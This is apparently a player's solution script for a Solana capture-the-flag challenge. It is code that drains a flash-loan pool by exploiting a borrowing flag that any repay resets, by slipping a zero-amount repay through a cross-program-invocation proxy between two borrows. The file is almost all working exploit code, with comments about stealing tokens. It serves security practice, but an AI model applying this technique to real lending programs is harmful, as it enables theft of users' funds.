import * as fs from "fs";
import * as anchor from "@project-serum/anchor";
import { BN } from "bn.js";

import * as api from "./api.js"; 
import { sleep, parseAccounts, sendInstructions } from "./util.js";
import { SYSVAR_INSTRUCTIONS_PUBKEY, Transaction, PublicKey } from "@solana/web3.js";
import { getAssociatedTokenAddress, TOKEN_PROGRAM_ID } from "@solana/spl-token";

const idl = JSON.parse(fs.readFileSync("../idl/challenge3.json"));
const accountFile = parseAccounts(fs.readFileSync("../" + api.PLAYERFILE));
const player = accountFile.player;
const accounts = accountFile.challengeThree;
const program = new anchor.Program(idl, accounts.programId.toString(), "fake truthy value");
const baseUrl = accountFile.endpoint.match(/^(https*:\/\/[^\/]+)\/.*/)[1];
const conn = new anchor.web3.Connection(accountFile.endpoint);

const timer = ms => new Promise( res => setTimeout(res, ms));

// all player code goes here
async function attack() {
    const depositorTokenAccount = await getAssociatedTokenAddress(accounts.atomcoinMint, player.publicKey);
    const cpiProgramID = new PublicKey(await api.deployProgram(baseUrl, player.publicKey, fs.readFileSync("../chain/target/bpfel-unknown-unknown/release/spl_example_cross_program_invocation.so")));
    // the bug is kinda obvious cuz i thought of this exact bug when looking at hana's original flash loan program lmao
    // ~~we can put 2 borrows with 1 repay after~~
    // there's a borrowing field that gets reset on *any* repay
    // borrow -> repay with cpi to avoid being checked by borrow and getting yeeted for invalid repay amt -> borrow again -> repay
    // keep doing this until there's only 2 tokens left in the pool
    const exploit = async (amount) => {
        const exploitTX = new Transaction();
        exploitTX.add(program.instruction.borrow(new BN(amount), {
            accounts: {
                player: player.publicKey,
                state: accounts.state,
                pool: accounts.pool,
                poolAccount: accounts.poolAccount,
                depositorAccount: depositorTokenAccount,
                instructions: SYSVAR_INSTRUCTIONS_PUBKEY,
                tokenProgram: TOKEN_PROGRAM_ID,
            }
        }));
        const nullRepayIX = program.instruction.repay(new BN(0), {
            accounts: {
                player: player.publicKey,
                user: player.publicKey,
                state: accounts.state,
                pool: accounts.pool,
                poolAccount: accounts.poolAccount,
                depositorAccount: depositorTokenAccount,
                tokenProgram: TOKEN_PROGRAM_ID,
            }
        });
        nullRepayIX.keys = Array.prototype.concat([{
            pubkey: nullRepayIX.programId,
            isSigner: false,
            isWritable: false,
        }], nullRepayIX.keys);
        nullRepayIX.programId = cpiProgramID;
        exploitTX.add(nullRepayIX);
        exploitTX.add(program.instruction.borrow(new BN(amount), {
            accounts: {
                player: player.publicKey,
                state: accounts.state,
                pool: accounts.pool,
                poolAccount: accounts.poolAccount,
                depositorAccount: depositorTokenAccount,
                instructions: SYSVAR_INSTRUCTIONS_PUBKEY,
                tokenProgram: TOKEN_PROGRAM_ID,
            }
        }));
        exploitTX.add(program.instruction.repay(new BN(amount), {
            accounts: {
                player: player.publicKey,
                user: player.publicKey,
                state: accounts.state,
                pool: accounts.pool,
                poolAccount: accounts.poolAccount,
                depositorAccount: depositorTokenAccount,
                tokenProgram: TOKEN_PROGRAM_ID,
            }
        }));

        exploitTX.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
        exploitTX.feePayer = player.publicKey;
        exploitTX.sign(player);
        await conn.sendRawTransaction(exploitTX.serialize(), {preflightCommitment: 'processed'});
    }

    // steal 50 tokens
    await exploit(50);
    await timer(500);
    // 50 remaining in pool, steal half
    await exploit(25);
    await timer(500);
    // 25 remaining in pool, steal 12
    await exploit(12);
    await timer(500);
    // 13 remaining in pool, steal 6
    await exploit(6);
    await timer(500);
    // 7 remaining in pool, steal 3
    await exploit(3);
    await timer(500);
    // 4 remaining in pool, steal 2
    await exploit(2);
    await timer(500);
    // 2 remaining in pool, steal 1 cuz why the fuck not lmao
    await exploit(1);
}

console.log("running attack code...");
await attack();

console.log("checking win...");
const flag = await api.getFlag(baseUrl, player.publicKey, 3);

if(flag) {
    console.log("win! your flag is:", flag);
}
else {
    console.log("no win");
}
